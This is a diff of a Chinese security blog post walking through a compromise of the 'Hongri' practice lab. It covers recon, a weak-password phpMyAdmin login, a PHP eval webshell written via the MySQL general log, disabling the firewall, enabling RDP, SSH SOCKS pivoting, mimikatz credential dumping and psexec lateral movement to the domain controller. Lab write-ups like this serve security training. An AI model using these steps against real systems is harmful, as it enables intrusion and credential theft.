@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>category: 红队研究 | wh1t3zer</title>
+  <title>红日打靶(1) | wh1t3zer</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -562,107 +562,540 @@
 </header>
         <!-- 内容区域 -->
         
+ <!-- prismjs 代码高亮 -->
+ 
 
-<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"></div>
-<div class="bg-light-floor-categoryDetail" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -3;"></div>
 
-<div class="category-header"  style="background-image:url('https://pic3.zhimg.com/80/v2-98dcd81cb0d1fee52a807c13cedb8338_1440w.jpg?source=1940ef5c')">
-  <div class="category-header-title">
-    category
-  </div>
-  <div class="category-header-desc">
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('/medias/img19.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        红日打靶(1)
+      </span>
+    </div>
     
-      <span class="title" id="category-header-desc"></span>
-      <script>
-  function typedFn() {
-    const el = '#category-header-desc';
-    const type = 'categoryDetail';
-    let desc = '愿你如风，被人温柔以待'
-    var typed = new Typed(el, {
-      strings: [desc],
-      startDelay: 100,
-      typeSpeed: 100,
-      loop: true,
-      backSpeed: 50,
-      showCursor: true
-    });
-  }
-  typedFn();
-</script>
+    
       
-  </div>
-  <div class="mask-box"></div>
-</div>
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> Published in：2025-11-15 |
+        </span>
+      
 
-
-<div class="category">
-  <div class="category-name">
-    <div class="name" style="background-color: #FFF;">红队研究 category</div>
-  </div>
-  <!-- 每一篇文章卡片 -->
-  <!-- hash算法 -->
-
-<section class="posts">
-  
-    
-    <article class="post reveal" style="flex-direction: row-reverse;   ">
-      <div class="post-main">
-        <div class="post-info">
-          <div class="post-time">
-            <i class="fas fa-clock" aria-hidden="true"></i>
-            <span class="post-time">2025-07-30</span>
-          </div>
-          <div class="post-title">
-            <a class="post-title-link" href="/2025/07/30/%E4%B8%BB%E6%B5%81c2%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(Sliver%E7%AF%87)/">主流c2代码分析(Sliver篇)</a>
-          </div>
-          <div class="post-meta">
-            <div class="post-tags">
-              <!-- 文章详情页的标签 -->
-
-    <i class="iconfont icontag"></i>
-    <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C2/" rel="tag">C2</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sliver/" rel="tag">sliver</a></li></ul>
-
-            </div>
-            <div class="post-categories">
-              <!-- 文章详情页的分类 -->
-
-<div class="article-category">
-  <i class="iconfont iconbookmark1"></i>
-  <a class="article-category-link" href="/categories/C2/">C2</a> <a class="article-category-link" href="/categories/C2/%E7%BA%A2%E9%98%9F%E7%A0%94%E7%A9%B6/">红队研究</a> <a class="article-category-link" href="/categories/C2/%E7%BA%A2%E9%98%9F%E7%A0%94%E7%A9%B6/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/">安全开发</a>
-</div>
-
-
-            </div>
-          </div>
-          <div class="post-img-mobile">
-            <a href="/2025/07/30/%E4%B8%BB%E6%B5%81c2%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(Sliver%E7%AF%87)/" style="background-size: cover; 
-              background-position: center center;">
-              <img class="lazyload lazyload placeholder" src="/medias/img15.jpg" class="lazyload placeholder" data-srcset="/medias/img15.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> category：
+          
+            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-detail-header_category">
+              靶机
             </a>
-          </div>
-          <div class="post-content">
-            0x00前言最近时间闲得无事就捣鼓起远控，其实说起远控都有比较久的历史了，不管是以前基于MSF框架，还是现在windows的GUI远控，比如大灰狼、gh0st、Cobaltstrike等等，通信方式都有各自特点，甚至运行机制不同，有的是c-
-          </div>
-        </div>
-        <div class="post-more">
-          <a href="/2025/07/30/%E4%B8%BB%E6%B5%81c2%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(Sliver%E7%AF%87)/">
-            <i class="iconfont iconmore" pointer style="float: right;  " title="阅读更多"></i>
-          </a>
-        </div>
+          
+            <a href="/categories/%E9%9D%B6%E6%9C%BA/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-detail-header_category">
+              内网渗透
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="row justify-position" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>靶机IP:192.168.242.245</p>
+<p>先查端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -O -p- 192.168.242.245 -T4 --min-rate 1000</span><br></pre></td></tr></table></figure>
+
+<p>发现几个关键端口，开放 80的 web 端口， 65534 ssh 和 445 带有工作组的端口，优先看看 80</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.242.245</span><br><span class="line">Host is up (0.020s latency).</span><br><span class="line">Not shown: 65523 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: GOD)</span><br><span class="line">1025/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">1026/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">1027/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">1028/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">1029/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">1030/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">3306/tcp  open  mysql        MySQL (unauthorized)</span><br><span class="line">65534/tcp open  ssh          (protocol 2.0)</span><br><span class="line">Device <span class="built_in">type</span>: firewall</span><br><span class="line">Running (JUST GUESSING): Fortinet embedded (88%)</span><br><span class="line">OS CPE: cpe:/h:fortinet:fortigate_200b</span><br><span class="line">Aggressive OS guesses: Fortinet FortiGate 200B firewall (88%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: -7 hops</span><br><span class="line">Service Info: Host: STU1; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 82.37 seconds</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511190312441.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511190312441.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>用 dirsearch 扫描一下 web 的目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.242.245/ -i 200</span><br></pre></td></tr></table></figure>
+
+<p>扫出有phpMyAdmin</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[05:53:08] Starting: </span><br><span class="line">[05:55:01] 200 -   79KB - /phpinfo.php                                      </span><br><span class="line">[05:55:04] 200 -   32KB - /phpmyadmin/ChangeLog                             </span><br><span class="line">[05:55:04] 200 -    2KB - /phpmyadmin/README                                </span><br><span class="line">[05:55:07] 200 -    4KB - /phpMyAdmin/                                      </span><br><span class="line">[05:55:07] 200 -    4KB - /phpmyadmin/                                      </span><br><span class="line">[05:55:07] 200 -    4KB - /phpMyadmin/</span><br><span class="line">[05:55:07] 200 -    4KB - /phpmyAdmin/                                      </span><br><span class="line">[05:55:07] 200 -    4KB - /phpMyAdmin/index.php</span><br><span class="line">[05:55:07] 200 -    4KB - /phpmyadmin/index.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02漏洞利用"><a href="#0x02漏洞利用" class="headerlink" title="0x02漏洞利用"></a>0x02漏洞利用</h2><p>通过弱口令尝试 root&#x2F;root 进来了，第一时间想到 phpMyAdmin 写 shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511190315584.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511190315584.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>先查一下有没有开启 secure_file_priv</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;secure_file_priv&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>发现禁止写入，只有 secure_file_priv 为空字符串才可以任意写入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511190321806.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511190321806.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>转变思路，开启 mysql 日志查询，访问日志获得 shell，这里我们在80 页面的 phpinfo 探针获得了绝对路径C:&#x2F;phpstudy_pro&#x2F;WWW</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log = &#x27;ON&#x27;;</span><br><span class="line">SET GLOBAL general_log_file = &#x27;C:/phpstudy_pro/WWW/shell.php&#x27;;</span><br><span class="line">SELECT &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;;</span><br><span class="line">SET GLOBAL general_log = &#x27;OFF&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>用蚁剑访问 <a target="_blank" rel="noopener" href="http://192.168.242.245/shell.php">http://192.168.242.245/shell.php</a> 可以拿到 shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511190328090.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511190328090.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>翻目录翻到了一堆 ssh 相关密钥其实没啥用，确定是一台 windows 电脑，所以侧重点还是考虑开 3389 rdp 操作，并且 whoami 可以看到是 system 命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511191732971.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511191732971.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h2 id="0x03进入内网"><a href="#0x03进入内网" class="headerlink" title="0x03进入内网"></a>0x03进入内网</h2><p>先关闭防火墙</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p>用了这个工具强行开启 3389</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sobinge/shadow2/blob/master/%E6%8F%90%E6%9D%83%E5%88%A9%E5%99%A8/%E5%BC%803389%E7%AB%AF%E5%8F%A3%EF%BC%88%E7%A5%9E%E5%99%A8%EF%BC%89/kai3389.exe">https://github.com/sobinge/shadow2/blob/master/%E6%8F%90%E6%9D%83%E5%88%A9%E5%99%A8/%E5%BC%803389%E7%AB%AF%E5%8F%A3%EF%BC%88%E7%A5%9E%E5%99%A8%EF%BC%89/kai3389.exe</a></p>
+<p>也可以使用下面的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>然后连进去</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511191731782.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511191731782.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>使用 ipconfig &#x2F;all，发现这台主机的另一个网卡地址，并确定另外一个网段 192.168.52.0&#x2F;24</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511191738033.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511191738033.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511191736168.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511191736168.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>net localgroup administrators，查看本地管理员组</p>
+<p>SSH 转发端口到内网网段</p>
+<p>ssh -D 1080 <a href="mailto:&#65;&#x64;&#x6d;&#105;&#110;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#114;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#50;&#52;&#x32;&#x2e;&#50;&#x34;&#53;">&#65;&#x64;&#x6d;&#105;&#110;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#114;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#50;&#52;&#x32;&#x2e;&#50;&#x34;&#53;</a> -p 65534 -N -f </p>
+<p>流量代理用的是proxychains4，修改相关文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+
+<p>将最后的 tor 网络监听注释掉，并追加一行 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1:1080</span><br></pre></td></tr></table></figure>
+
+<p>测试一下能否正常，发现是可以访问的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychain4 curl -I http://192.168.52.141</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511191957602.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511191957602.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>使用内网主机发现，这里因为太慢了，看了下配置文件，在&#x2F;etc&#x2F;proxychains4.conf 文件里面默认设置超时时间太长了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcp_read_time_out 15000</span><br><span class="line">tcp_connect_time_out 8000</span><br></pre></td></tr></table></figure>
+
+<p>因为是靶机，改成 500 和 1000，就快一点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -f /tmp/fast_proxy.conf nmap -sT -Pn -p 445,80,22 192.168.52.0/24</span><br></pre></td></tr></table></figure>
+
+<p>这里有个小坑，使用 proxychains 用这个命令会显示全部 hosts up，如果单纯在 nmap 是可以扫出来的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sn -PR -n 192.168.52.143/24</span><br></pre></td></tr></table></figure>
+
+<p>查了资料说是本地调用是走 arp 协议的，而arp 属于二层，proxychains4 走第四层协议，数据包无法通过代理，最后发现是有 2 个主机，192.168.52.138，192.168.52.141，并且都开启了 445 端口，尝试下走 SMB</p>
+<p>并且在之前的搜索中知道域 god.org</p>
+<h2 id="0x04横向移动"><a href="#0x04横向移动" class="headerlink" title="0x04横向移动"></a>0x04横向移动</h2><p>用 mimikatz 抓取域内的用户凭证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511192136755.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511192136755.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 psexec \\192.168.52.138 -u administrator -p hongrisec@2025 cmd.exe</span><br><span class="line">proxychains4 winexe -U administrator%hongrisec@2025 //192.168.52.138 <span class="string">&quot;cmd.exe /c chcp 65001 &amp;&amp; cmd.exe&quot;</span></span><br><span class="line"><span class="comment"># 这里是系统乱码，chcp 65001 是UTF-8</span></span><br><span class="line">chcp 65001    <span class="comment"># UTF-8</span></span><br><span class="line">chcp 437      <span class="comment"># 英文 (美国)</span></span><br><span class="line">chcp 936      <span class="comment"># 中文 (简体)</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到域控管理员权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511200054967.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/hongri/202511200054967.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h2 id="0x05总结"><a href="#0x05总结" class="headerlink" title="0x05总结"></a>0x05总结</h2><p>该靶场有多种外网漏洞利用方式，其中一种是这个日志查询写webshell，还有其他的，字典足够大的情况下能扫描到beifen.rar文件，里面是网站的源代码，查看到一个yxcms文件夹，可以得知是一个cms平台，访问IP+文件夹名进入网站，有文件上传漏洞</p>
+
       </div>
-      <div class="post-img">
-        <a href="/2025/07/30/%E4%B8%BB%E6%B5%81c2%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(Sliver%E7%AF%87)/" style="background-size: cover; 
-          background-position: center center;">
-          <img class="lazyload lazyload placeholder" src="/medias/img15.jpg" class="lazyload placeholder" data-srcset="/medias/img15.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
-        </a>
+      <div class="post-tags-categories">
+        
       </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>author:  </strong>wh1t3zer</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>link:  </strong>
+    <a href="/2025/11/15/红日靶机(1)/" target="_blank" title="红日打靶(1)">https://wh1t3zer.github.io/2025/11/15/红日靶机(1)/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>Copyright notice:   </strong>
+      All articles on this website, unless otherwise stated, adopt <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      reprint policy. If reproduced, please indicate source!
+    </li>
+  </ul>
+<div>
+      
     </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+
+
   
-</section>
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/img24.jpg" class="lazyload placeholder" data-srcset="/medias/img24.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+    </div>
+    <a href="/2025/10/25/wireguard%E9%83%A8%E7%BD%B2%E8%BF%9E%E5%AE%B6%E5%BA%AD%E4%B8%BB%E6%9C%BA/" class="post-nav-link">
+      <div class="title">
+        Next: <i class="fas fa-angle-right"></i>
+        <div class="title-text">WireGuard接入家庭主机记录</div>
+      </div>
+      <!-- <div class="content">
+        0x00前言最近一段时间不在家，想直连家庭电脑，没有家庭公网IP，如果用rustdesk、todesk、向日葵这些，因为
+      </div> -->
+    </a>
+  </div>
+
 </div>
-<div class="w-70">
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-show="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-show="visible">
+      <div class="donate-box_close">
+        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          你的赏识是我前进的动力
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
+          <img src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
+          <img src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
+</script>
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fas fa-list-ul" aria-hidden="true"></i><span>catalog</span>
+        
+          <div class="toc-open-close">catalog</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 手机端目录按钮 -->
+  <div id="toc-mobile-btn">
+    <i class="fas fa-list-ul" aria-hidden="true"></i>
+  </div>
+
+
+<script>
+  function closeToc(init) {
+    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
+    $(".toc-content").css({'width': 0});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+  };
+  function openToc() {
+    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
+    $(".toc-content").css({'width': '300px'});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+  }
+  function openBtnClickFn () {
+    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+    let open = eval('' || 'true');
+    openOrCloseBtn.click(function() {
+      if (open) {
+        closeToc();
+        open = false;
+      } else {
+        openToc();
+        open = true;
+      }
+    });
+  };
+  openBtnClickFn();
+  initCloseTocWidth(true);
+
+  function initCloseTocWidth(init) {
+    if (window.innerWidth >= 992) {
+      let isClose = false;
+      isClose && closeToc(init)
+    }
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    $(".toc-aside").css({'transition': 'no'});
+  })
+  document.addEventListener('pjax:complete', function () {
+    openBtnClickFn();
+  })
   
+</script>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
 </div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
